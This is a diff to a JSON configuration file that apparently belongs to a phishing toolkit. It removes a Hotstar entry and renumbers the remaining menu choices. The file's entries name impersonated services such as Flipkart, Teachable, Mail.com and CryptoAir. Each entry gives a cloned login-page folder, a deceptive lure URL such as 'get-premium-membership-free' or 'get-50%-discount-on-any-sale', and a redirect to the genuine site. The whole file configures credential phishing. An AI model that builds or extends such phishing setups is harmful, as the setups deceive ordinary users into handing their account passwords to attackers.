@@ -504,49 +504,42 @@
       "redirect": "https://www.mobikwik.com"
     },
     {
-      "name": "Hotstar",
-      "choice": "71",
-      "folder": "login_hotstar",
-      "mask": "https://get-premium-membership-free",
-      "redirect": "https://www.hotstar.com/in"
-    },
-    {
       "name": "FlipCart",
-      "choice": "72",
+      "choice": "71",
       "folder": "login_flipcart",
       "mask": "https://get-50%-discount-on-any-sale",
       "redirect": "https://www.flipkart.com"
     },
     {
       "name": "Teachable",
-      "choice": "73",
+      "choice": "72",
       "folder": "login_teachable",
       "mask": "https://get-premium-membership-free",
       "redirect": "https://sso.teachable.com/secure/teachable_accounts/sign_in"
     },
     {
       "name": "Mail",
-      "choice": "74",
+      "choice": "73",
       "folder": "login_mail",
       "mask": "https://get-premium-membership-free",
       "redirect": "https://support.mail.com"
     },
     {
       "name": "CryptoAir",
-      "choice": "75",
+      "choice": "74",
       "folder": "login_cryptoair",
       "mask": "https://get-premium-membership-free",
       "redirect": "https://cryptoair.ltd/?a=forgot_password"
     },
     {
       "name": "Amino",
-      "choice": "76",
+      "choice": "75",
       "folder": "login_amino",
       "mask": "https://get-premium-membership-free"
     },
     {
       "name": "Custom",
-      "choice": "77",
+      "choice": "76",
       "folder": "custom",
       "mask": "custom"
     }
